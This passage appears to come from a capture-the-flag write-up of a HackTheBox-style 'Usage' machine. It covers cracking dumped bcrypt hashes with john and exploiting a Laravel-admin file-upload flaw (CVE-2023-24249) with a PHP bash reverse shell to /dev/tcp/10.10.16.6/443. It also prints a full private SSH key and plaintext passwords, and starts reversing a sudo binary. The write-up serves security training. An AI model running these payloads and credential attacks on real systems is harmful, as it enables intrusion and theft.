</span></span></span><span class=line><span class=cl><span class=go>| gunzf0x | gunzf0x@gunzf0x.htb | $2y$10$Iwn4leouz.OMaCrCrNAnju3DeLg44iBomGinDkBvoJi1yzT3L2lhm |
</span></span></span><span class=line><span class=cl><span class=go>| raj     | raj@raj.com         | $2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4. |
</span></span></span><span class=line><span class=cl><span class=go>| raj     | raj@usage.htb       | $2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa |
</span></span></span><span class=line><span class=cl><span class=go>+---------+---------------------+--------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>I save these hashes into a file and attempt a <code>Brute Force Password Cracking</code> with the tool <code>JohnTheRipper</code> (<code>john</code>) and get:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt raj_credentials
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
</span></span></span><span class=line><span class=cl><span class=go>Cost 1 (iteration count) is 1024 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>xander           (raj2)
</span></span></span><span class=line><span class=cl><span class=go>xander           (raj1)
</span></span></span><span class=line><span class=cl><span class=go>2g 0:00:00:37 DONE (2024-05-30 22:11) 0.05376g/s 59.27p/s 118.5c/s 118.5C/s monalisa..iloveme2
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>so we have credentials: <code>raj:xander</code>.</p><ul><li>I can log in with these credentials to <code>http://usage.htb</code>, but I see exactly the same as my generic account. Nothing new, sadly. These credentials do not work at <code>http://admin.usage.htb</code> either.</li><li>Back to <code>SQLMap</code> I remember an <code>admin_users</code> table. I try to dump its content, where I can see a <code>username</code> and <code>password</code> columns:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sqlmap -r request.req --batch -D usage_blog -T admin_users -C username,password --dump --threads 10
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Database: usage_blog
</span></span></span><span class=line><span class=cl><span class=go>Table: admin_users
</span></span></span><span class=line><span class=cl><span class=go>[1 entry]
</span></span></span><span class=line><span class=cl><span class=go>+----------+--------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=go>| username | password                                                     |
</span></span></span><span class=line><span class=cl><span class=go>+----------+--------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=go>| admin    | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
</span></span></span><span class=line><span class=cl><span class=go>+----------+--------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>I save again this user and password and attempt, again, a <code>Brute Force Password Cracking</code> with <code>john</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt admin_credentials
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
</span></span></span><span class=line><span class=cl><span class=go>Cost 1 (iteration count) is 1024 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>whatever1        (admin)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:00:11 DONE (2024-05-30 22:17) 0.08598g/s 139.2p/s 139.2c/s 139.2C/s amber1..serena
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>where we find credentials: <code>admin:whatever1</code></p><ul><li>I use these credentials at <code>http://admin.usage.htb</code> and they work. We can now see:</li></ul><p><img alt="Usage 7" src=/images/Usage_7.png></p><p>where I can clearly see a version <code>10.18.0</code> for <code>Laravel</code>.</p><ul><li>Searching for exploits for this version leads us to the vulnerability labeled as <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-24249 class=external-link target=_blank rel=noopener>CVE-2023-24249</a>. In short, this vulnerability allows us to execute arbitrary code via crafted <code>PHP</code> files. We can click on <code>Administrator</code> name at the top right, then on <code>Settings</code> and we should see a page like:</li></ul><p><img alt="Usage 8" src=/images/Usage_8.png></p><ul><li>I note that when I upload a file, it is uploaded at <code>https://admin.usage.htb/uploads/images/&lt;image-name></code>. But after some time, the system applies a reset (deletes the uploaded file), so we must act quickly.</li><li>We will intercept the uploaded file with <code>Burpsuite</code>. Click on <code>Reset</code> and I will upload a random <code>png</code> image called <code>sample.png</code>. Then, when clicking on <code>Submit</code> it is intercepted by <code>Burpsuite</code>. In the image data I will add the <code>PHP</code> payload:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>system</span><span class=p>(</span><span class=s1>&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.16.6/443 0&gt;&amp;1&#34;&#39;</span><span class=p>);</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>where <code>10.10.16.6</code> is my attacker IP and <code>443</code> is the port I will start listening with <code>netcat</code>. Also, before uploading the image, I will set the <code>filename</code> as <code>sample.png.php</code></p><p><img alt="Usage 9" src=/images/Usage_9.png></p><ul><li>Start a <code>netcat</code> listener on port <code>443</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span></code></pre></div><p>Upload the file and then quickly visit <code>https://admin.usage.htb/uploads/images/sample.png.php</code>.
I get a shell as <code>dash</code> user on my listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.18] 33774
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (1225): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>dash@usage:/var/www/html/project_admin/public/uploads/images$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>dash
</span></span></span></code></pre></div><ul><li>We could already get the user flag, but I check if we can connect via <code>SSH</code>. I note that this user has a <code>SSH</code> key at <code>/home/dash/.ssh/</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dash@usage:/var/www/html/project_admin/public/uploads/images$ cat /home/dash/.ssh/id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=go>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span></span><span class=line><span class=cl><span class=go>NhAAAAAwEAAQAAAYEA3TGrilF/7YzwawPZg0LvRlkEMJSJQxCXwxT+kY93SpmpnAL0U73Y
</span></span></span><span class=line><span class=cl><span class=go>RnNLYdwGVjYbO45FtII1B/MgQI2yCNrxl/1Z1JvRSQ97T8T9M+xmxLzIhFR4HGI4HTOnGQ
</span></span></span><span class=line><span class=cl><span class=go>doI30dWka5nVF0TrEDL4hSXgycsTzfZ1NitWgGgRPc3l5XDmzII3PsiTHrwfybQWjVBlql
</span></span></span><span class=line><span class=cl><span class=go>QWKmVzdVoD6KNotcYgjxnGVDvqVOz18m0ZtFkfMbkAgUAHEHOrTAnDmLY6ueETF1Qlgy4t
</span></span></span><span class=line><span class=cl><span class=go>iTI/l452IIDGdhMGNKxW/EhnaLaHqlGGwE93cI7+Pc/6dsogbVCEtTKfJfofBxM0XQ97Op
</span></span></span><span class=line><span class=cl><span class=go>LLZjLuj+iTfjIc+q6MKN+Z3VdTTmjkTjVBnDqiNAB8xtu00yE3kR3qeY5AlXlz5GzGrD2X
</span></span></span><span class=line><span class=cl><span class=go>M1gAml6w5K74HjFn/X4lxlzOZxfu54f/vkfdoL808OIc8707N3CvVnAwRfKS70VWELiqyD
</span></span></span><span class=line><span class=cl><span class=go>7seM4zmM2kHQiPHy0drZ/wl6RQxx2dAd87AbAZvbAAAFgGobXvlqG175AAAAB3NzaC1yc2
</span></span></span><span class=line><span class=cl><span class=go>EAAAGBAN0xq4pRf+2M8GsD2YNC70ZZBDCUiUMQl8MU/pGPd0qZqZwC9FO92EZzS2HcBlY2
</span></span></span><span class=line><span class=cl><span class=go>GzuORbSCNQfzIECNsgja8Zf9WdSb0UkPe0/E/TPsZsS8yIRUeBxiOB0zpxkHaCN9HVpGuZ
</span></span></span><span class=line><span class=cl><span class=go>1RdE6xAy+IUl4MnLE832dTYrVoBoET3N5eVw5syCNz7Ikx68H8m0Fo1QZapUFiplc3VaA+
</span></span></span><span class=line><span class=cl><span class=go>ijaLXGII8ZxlQ76lTs9fJtGbRZHzG5AIFABxBzq0wJw5i2OrnhExdUJYMuLYkyP5eOdiCA
</span></span></span><span class=line><span class=cl><span class=go>xnYTBjSsVvxIZ2i2h6pRhsBPd3CO/j3P+nbKIG1QhLUynyX6HwcTNF0PezqSy2Yy7o/ok3
</span></span></span><span class=line><span class=cl><span class=go>4yHPqujCjfmd1XU05o5E41QZw6ojQAfMbbtNMhN5Ed6nmOQJV5c+Rsxqw9lzNYAJpesOSu
</span></span></span><span class=line><span class=cl><span class=go>+B4xZ/1+JcZczmcX7ueH/75H3aC/NPDiHPO9Ozdwr1ZwMEXyku9FVhC4qsg+7HjOM5jNpB
</span></span></span><span class=line><span class=cl><span class=go>0Ijx8tHa2f8JekUMcdnQHfOwGwGb2wAAAAMBAAEAAAGABhXWvVBur49gEeGiO009HfdW+S
</span></span></span><span class=line><span class=cl><span class=go>ss945eTnymYETNKF0/4E3ogOFJMO79FO0js317lFDetA+c++IBciUzz7COUvsiXIoI4PSv
</span></span></span><span class=line><span class=cl><span class=go>FMu7l5EaZrE25wUX5NgC6TLBlxuwDsHja9dkReK2y29tQgKDGZlJOksNbl9J6Om6vBRa0D
</span></span></span><span class=line><span class=cl><span class=go>dSN9BgVTFcQY4BCW40q0ECE1GtGDZpkx6vmV//F28QFJZgZ0gV7AnKOERK4hted5xzlqvS
</span></span></span><span class=line><span class=cl><span class=go>OQzjAQd2ARZIMm7HQ3vTy+tMmy3k1dAdVneXwt+2AfyPDnAVQfmCBABmJeSrgzvkUyIUOJ
</span></span></span><span class=line><span class=cl><span class=go>ZkEZhOsYdlmhPejZoY/CWvD16Z/6II2a0JgNmHZElRUVVf8GeFVo0XqSWa589eXMb3v/M9
</span></span></span><span class=line><span class=cl><span class=go>dIaqM9U3RV1qfe9yFdkZmdSDMhHbBAyl573brrqZ+Tt+jkx3pTgkNdikfy3Ng11N/437hs
</span></span></span><span class=line><span class=cl><span class=go>UYz8flG2biIf4/qjgcUcWKjJjRtw1Tab48g34/LofevamNHq7b55iyxa1iJ75gz8JZAAAA
</span></span></span><span class=line><span class=cl><span class=go>wQDN2m/GK1WOxOxawRvDDTKq4/8+niL+/lJyVp5AohmKa89iHxZQGaBb1Z/vmZ1pDCB9+D
</span></span></span><span class=line><span class=cl><span class=go>aiGYNumxOQ8HEHh5P8MkcJpKRV9rESHiKhw8GqwHuhGUNZtIDLe60BzT6DnpOoCzEjfk9k
</span></span></span><span class=line><span class=cl><span class=go>gHPrtLW78D2BMbCHULdLaohYgr4LWsp6xvksnHtTsN0+mTcNLZU8npesSO0osFIgVAjBA6
</span></span></span><span class=line><span class=cl><span class=go>6blOVm/zpxsWLNx6kLi41beKuOyY9Jvk7zZfZd75w9PGRfnc4AAADBAOOzmCSzphDCsEmu
</span></span></span><span class=line><span class=cl><span class=go>L7iNP0RHSSnB9NjfBzrZF0LIwCBWdjDvr/FnSN75LZV8sS8Sd/BnOA7JgLi7Ops2sBeqNF
</span></span></span><span class=line><span class=cl><span class=go>SD05fc5GcPmySLO/sfMijwFYIg75dXBGBDftBlfvnZZhseNovdTkGTtFwdN+/bYWKN58pw
</span></span></span><span class=line><span class=cl><span class=go>JSb7iUaZHy80a06BmhoyNZo4I0gDknvkfk9wHDuYNHdRnJnDuWQVfbRwnJY90KSQcAaHhM
</span></span></span><span class=line><span class=cl><span class=go>tCDkmmKv42y/I6G+nVoCaGWJHpyLzh7QAAAMEA+K8JbG54+PQryAYqC4OuGuJaojDD4pX0
</span></span></span><span class=line><span class=cl><span class=go>s1KWvPVHaOOVA54VG4KjRFlKnPbLzGDhYRRtgB0C/40J3gY7uNdBxheO7Rh1Msx3nsTT9v
</span></span></span><span class=line><span class=cl><span class=go>iRSpmo2FKJ764zAUVuvOJ8FLyfC20B4uaaQp0pYRgoA5G2BxjtWnCCjvr2lnj/J3BmKcz/
</span></span></span><span class=line><span class=cl><span class=go>b2e7L0VKD4cNk9DsAWwagAK2ZRHlQ5J60udocmNBEugyGe8ztkRh1PYCB8W1Jqkygc8kpT
</span></span></span><span class=line><span class=cl><span class=go>63zj5LQZw2/NvnAAAACmRhc2hAdXNhZ2U=
</span></span></span><span class=line><span class=cl><span class=go>-----END OPENSSH PRIVATE KEY-----
</span></span></span></code></pre></div><p>where I save this key as <code>dash_id_rsa</code>.</p><ul><li>Once saved, assign to it permissions and use it to connect via <code>SSH</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nvim id_rsa_dash # save the key
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ chmod 600 id_rsa_dash
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ssh -i id_rsa_dash dash@10.10.11.18
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>The list of available updates is more than a week old.
</span></span></span><span class=line><span class=cl><span class=go>To check for new updates run: sudo apt update
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Last login: Mon Apr  8 12:35:43 2024 from 10.10.14.40
</span></span></span><span class=line><span class=cl><span class=go>dash@usage:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dash
</span></span></span></code></pre></div><p>and we can get the user flag.</p><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>I will upload <code>LinPEAS</code> (that can be downloaded from <a href=https://github.com/peass-ng/PEASS-ng/releases/tag/20240526-eac1a3fa class=external-link target=_blank rel=noopener>its Github repository</a>) using <code>scp</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ scp -i id_rsa_dash linpeas.sh dash@10.10.11.18:/tmp/linpeas.sh
</span></span></span></code></pre></div><p>and assigning to it execution permissions in the target machine with <code>chmod +x /tmp/linpeas.sh</code>.</p><ul><li>Running it finds a <code>.env</code> file with a password:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dash@usage:~$ /tmp/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Analyzing Backup Manager Files (limit 70)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-rwxrwxr-x 1 dash dash 5289 Aug 13  2023 /var/www/html/project_admin/config/database.php
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Analyzing Env Files (limit 70)
</span></span></span><span class=line><span class=cl><span class=go>-rwxrwxr-x 1 dash dash 1176 Aug 23  2023 /var/www/html/project_admin/.env
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>DB_CONNECTION=mysql
</span></span></span><span class=line><span class=cl><span class=go>DB_HOST=127.0.0.1
</span></span></span><span class=line><span class=cl><span class=go>DB_PORT=3306
</span></span></span><span class=line><span class=cl><span class=go>DB_DATABASE=usage_blog
</span></span></span><span class=line><span class=cl><span class=go>DB_USERNAME=staff
</span></span></span><span class=line><span class=cl><span class=go>DB_PASSWORD=s3cr3t_c0d3d_1uth
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>but I note this is the database we have dumped through <code>SQL Injection|SQLi</code>, so it is not worth wasting our time on it.</p><ul><li>I check files in <code>/home/dash</code> directory. <code>.monitrc</code> is not a typical file. Checking it:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dash@usage:~$ cat .monitrc
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span>Monitoring Interval in Seconds
</span></span><span class=line><span class=cl><span class=go>set daemon  60
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span>Enable Web Access
</span></span><span class=line><span class=cl><span class=go>set httpd port 2812
</span></span></span><span class=line><span class=cl><span class=go>     use address 127.0.0.1
</span></span></span><span class=line><span class=cl><span class=go>     allow admin:3nc0d3d_pa$$w0rd
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span>Apache
</span></span><span class=line><span class=cl><span class=go>check process apache with pidfile &#34;/var/run/apache2/apache2.pid&#34;
</span></span></span><span class=line><span class=cl><span class=go>    if cpu &gt; 80% for 2 cycles then alert
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span>System Monitoring
</span></span><span class=line><span class=cl><span class=go>check system usage
</span></span></span><span class=line><span class=cl><span class=go>    if memory usage &gt; 80% for 2 cycles then alert
</span></span></span><span class=line><span class=cl><span class=go>    if cpu usage (user) &gt; 70% for 2 cycles then alert
</span></span></span><span class=line><span class=cl><span class=go>        if cpu usage (system) &gt; 30% then alert
</span></span></span><span class=line><span class=cl><span class=go>    if cpu usage (wait) &gt; 20% then alert
</span></span></span><span class=line><span class=cl><span class=go>    if loadavg (1min) &gt; 6 for 2 cycles then alert
</span></span></span><span class=line><span class=cl><span class=go>    if loadavg (5min) &gt; 4 for 2 cycles then alert
</span></span></span><span class=line><span class=cl><span class=go>    if swap usage &gt; 5% then alert
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>check filesystem rootfs with path /
</span></span></span><span class=line><span class=cl><span class=go>       if space usage &gt; 80% then alert
</span></span></span></code></pre></div><p>we have credentials: <code>admin:3nc0d3d_pa$$w0rd</code>.</p><ul><li>Checking users in this machine we have:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dash@usage:~$ ls /home
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dash  xander
</span></span></span></code></pre></div><ul><li>I attempt to change to <code>xander</code> user with this new password (<code>3nc0d3d_pa$$w0rd</code>) and it works:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dash@usage:~$ su xander
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>xander@usage:/home/dash$
</span></span></span></code></pre></div><ul><li>I check what commands can this user run with <code>sudo</code> and we have one program:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>xander@usage:/home/dash$ sudo -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Matching Defaults entries for xander on usage:
</span></span></span><span class=line><span class=cl><span class=go>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User xander may run the following commands on usage:
</span></span></span><span class=line><span class=cl><span class=go>    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
</span></span></span></code></pre></div><p>we find that we can execute <code>/usr/bin/usage_management</code> as <code>root</code> without providing a password.</p><ul><li>It is a compiled binary:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>xander@usage:/home/dash$ file /usr/bin/usage_management
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/usr/bin/usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, for GNU/Linux 3.2.0, not stripped
</span></span></span></code></pre></div><ul><li>Using <code>strings</code> we have:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>xander@usage:/home/dash$ strings /usr/bin/usage_management
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/lib64/ld-linux-x86-64.so.2
</span></span></span><span class=line><span class=cl><span class=go>chdir
</span></span></span><span class=line><span class=cl><span class=go>__cxa_finalize
</span></span></span><span class=line><span class=cl><span class=go>__libc_start_main
</span></span></span><span class=line><span class=cl><span class=go>puts
</span></span></span><span class=line><span class=cl><span class=go>system
</span></span></span><span class=line><span class=cl><span class=go>__isoc99_scanf
</span></span></span><span class=line><span class=cl><span class=go>perror
</span></span></span><span class=line><span class=cl><span class=go>printf
</span></span></span><span class=line><span class=cl><span class=go>libc.so.6
</span></span></span><span class=line><span class=cl><span class=go>GLIBC_2.7
</span></span></span><span class=line><span class=cl><span class=go>GLIBC_2.2.5
</span></span></span><span class=line><span class=cl><span class=go>GLIBC_2.34
</span></span></span><span class=line><span class=cl><span class=go>_ITM_deregisterTMCloneTable
</span></span></span><span class=line><span class=cl><span class=go>__gmon_start__
</span></span></span><span class=line><span class=cl><span class=go>_ITM_registerTMCloneTable
</span></span></span><span class=line><span class=cl><span class=go>PTE1
</span></span></span><span class=line><span class=cl><span class=go>u+UH
</span></span></span><span class=line><span class=cl><span class=go>/var/www/html
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
</span></span></span><span class=line><span class=cl><span class=go>Error changing working directory to /var/www/html
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/mysqldump -A &gt; /var/backups/mysql_backup.sql
</span></span></span><span class=line><span class=cl><span class=go>Password has been reset.
</span></span></span><span class=line><span class=cl><span class=go>Choose an option:
</span></span></span><span class=line><span class=cl><span class=go>1. Project Backup
</span></span></span><span class=line><span class=cl><span class=go>2. Backup MySQL data
</span></span></span><span class=line><span class=cl><span class=go>3. Reset admin password
</span></span></span><span class=line><span class=cl><span class=go>Enter your choice (1/2/3):
</span></span></span><span class=line><span class=cl><span class=go>Invalid choice.
</span></span></span><span class=line><span class=cl><span class=go>:*3$&#34;
</span></span></span><span class=line><span class=cl><span class=go>GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
</span></span></span><span class=line><span class=cl><span class=go>Scrt1.o
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>but it does not say much about how the binary works. Just that it gives some options.</p><ul><li>Just to attempt some <code>Reverse Engineering</code> I pass this binary to my machine using <code>scp</code>. I run on my machine:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ scp -i id_rsa_dash dash@10.10.11.18:/usr/bin/usage_management ./usage_management
</span></span></span></code></pre></div><ul><li>Then, I open this binary with <code>Ghidra</code>. Analyzing the <code>main</code> function this seems like a program written in <code>C</code>:</li></ul><p><img alt="Usage 10" src=/images/Usage_10.png></p><p>where the <code>main</code> function is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>undefined8</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>local_c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Choose an option:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;1. Project Backup&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;2. Backup MySQL data&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;3. Reset admin password&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Enter your choice (1/2/3): &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>DAT_0010214c</span><span class=p>,</span><span class=o>&amp;</span><span class=n>local_c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>local_c</span> <span class=o>==</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>resetAdminPassword</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>local_c</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>local_c</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>backupWebContent</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>local_c</span> <span class=o>==</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>backupMysqlData</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
